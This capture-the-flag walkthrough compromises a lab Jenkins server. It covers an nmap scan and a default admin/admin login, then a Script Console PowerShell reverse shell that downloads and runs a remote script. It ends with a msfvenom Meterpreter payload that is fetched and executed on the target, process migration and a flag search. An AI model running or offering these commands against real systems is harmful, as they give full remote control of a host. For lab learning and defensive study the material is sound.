
# 🧰 Jenkins Machine - Exploitation Walkthrough

## 🔍 Step 1: Initial Nmap Scan

Run an Nmap scan to identify open ports:
```bash
nmap -sC -sV -T4 -p- <target-ip>
```

**Discovered open ports:**
- `80/tcp` – HTTP
- `8080/tcp` – Jenkins
- `3389/tcp` – RDP

---

## 🌐 Step 2: Jenkins Login

Access Jenkins at:  
`http://<target-ip>:8080`

Try default credentials:  
**Username:** `admin`  
**Password:** `admin`

> Login was successful.

---

## 💣 Step 3: Gain Reverse Shell via Jenkins Script Console

Use Jenkins’s **Script Console**:  
`http://<target-ip>:8080/script`

Execute the following **PowerShell reverse shell payload**:
```groovy
"cmd.exe /c powershell -nop -c \"iex (New-Object Net.WebClient).DownloadString('http://10.21.183.238/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.21.183.238 -Port 4444\"".execute()
```

> **Note:** Ensure a listener is running on your attack machine:
```bash
nc -lvnp 4444
```

---

## 🧬 Step 4: Generate Meterpreter Shell

Create a Meterpreter reverse shell payload:
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.21.183.238 LPORT=4444 -f exe -o shell.exe
```

---

## 📦 Step 5: Host the Payload

Start an HTTP server to host the `shell.exe`:
```bash
python3 -m http.server 8000
```

---

## 📥 Step 6: Download & Execute Payload from Target

On the target (via existing shell or Jenkins), run:
```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.21.183.238:8000/shell.exe','shell.exe')"
Start-Process shell.exe
```

---

## 🧠 Step 7: Receive Meterpreter Shell

Start Metasploit and configure the handler:
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.21.183.238
set LPORT 4444
exploit
```

> You should receive a Meterpreter session.

---

## 📊 Step 8: Migrate to Stable Process

List running processes:
```bash
ps
```

Find a stable process like `services.exe` and migrate:
```bash
migrate <PID>
```

Example:
```bash
migrate 580
```

---

## 🎯 Final Step: Capture the Flag

In Meterpreter shell:
```bash
shell
cd \
dir /s flag.txt
```

Check common locations:
- `C:\Users\Administrator\Desktop\`
- `C:\Users\<username>\Desktop\`

Look for files named `flag.txt`, `root.txt`, or `proof.txt`.

---
